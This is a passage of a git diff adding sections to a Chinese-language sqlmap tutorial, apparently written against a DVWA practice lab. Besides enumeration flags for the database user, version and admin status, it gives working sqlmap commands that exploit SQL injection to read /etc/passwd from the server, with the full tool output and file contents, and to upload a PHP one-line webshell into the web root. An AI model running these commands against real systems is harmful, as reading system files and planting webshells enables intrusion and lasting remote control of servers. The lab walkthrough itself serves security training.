@@ -181,3 +181,89 @@ Oswald:sqlmap-dev oliver$ python3 sqlmap.py -l /Users/oliver/Desktop/test_burpsu
 python sqlmap.py -u"http://www.target.com/vuln.php? id=1&amp;hash=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib;hash=hashlib.md5(id).hexdigest()"
 ```
 ### 10、-o，开启所有优化开关
+### 11、重要参数
+```yaml
+参数:-b,--banner 大多数的数据库系统都有一个函数可以返回数据库的版本号，
+通常这个函数是version()或者变量@@version这主要取决与是什么数据库。
+```
+```yaml
+参数:-current-user
+在大多数据库中可以获取到管理数据的用户。
+```
+```yaml
+参数:--current-db
+返还当前连接的数据库
+```
+```yaml
+参数:--is-dba
+判断当前的用户是否为管理员，是的话会返回True。
+```
+```yaml
+参数:--users
+当前用户有权限读取包含所有用户的表的权限时，就可以列出所有管理用户。
+```
+### 12、文件系统，读写上传文件等
+#### 12.1 读取被攻击数据库的文件，--file-read
+```shell script
+Oswald:sqlmap-dev oliver$ python3 sqlmap.py -u "http://172.16.120.252:8080/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie="PHPSESSID=iepjlmrss0sgkel1rco5p50np4; security=low" --file-read "/etc/passwd"
+```
+##### 攻击后，读取的文件，保存路径如下
+```shell script
+ [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Debian 8 (jessie)
+web application technology: Apache 2.4.10
+back-end DBMS: MySQL >= 5.0
+[11:42:29] [INFO] fingerprinting the back-end DBMS operating system
+[11:42:29] [WARNING] reflective value(s) found and filtering out
+[11:42:29] [INFO] the back-end DBMS operating system is Linux
+[11:42:29] [INFO] fetching file: '/etc/passwd'
+do you want confirmation that the remote file '/etc/passwd' has been successfully downloaded from the back-end DBMS file system? [Y/n] y
+[11:42:32] [INFO] the local file '/Users/oliver/.local/share/sqlmap/output/172.16.120.252/files/_etc_passwd' and the remote file '/etc/passwd' have the same size (1253 B)  # 文件具体地址
+files saved to [1]:
+[*] /Users/oliver/.local/share/sqlmap/output/172.16.120.252/files/_etc_passwd (same file)
+
+[11:42:32] [INFO] fetched data logged to text files under '/Users/oliver/.local/share/sqlmap/output/172.16.120.252'   # 文件保存的路径
+
+[*] ending @ 11:42:32 /2022-01-29/
+```
+##### 查看文件信息
+```shell script
+Oswald:sqlmap-dev oliver$ cd /Users/oliver/.local/share/sqlmap/output/172.16.120.252/files
+Oswald:files oliver$ cat _etc_passwd 
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin    # dvwa的用户是这个
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
+mysql:x:104:107:MySQL Server,,,:/nonexistent:/bin/false
+```
+#### 12.2 把文件上传到数据库服务器中
+```yaml
+--file-write：需要上传的文件的本地路径
+--file-dest：上传到被攻击的服务器上的路径
+```
+##### 上传php一句话木马
+```shell script
+Oswald:sqlmap-dev oliver$ python3 sqlmap.py -u "http://172.16.120.252:8080/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id \
+--cookie="PHPSESSID=iepjlmrss0sgkel1rco5p50np4; security=low" \
+--file-write="/Users/oliver/Desktop/get_shell.php" \
+--file-dest="/var/www/html/get_shell.php"
+```
+![image](https://github.com/498946975/Security/blob/master/images/sql_map_4.png)
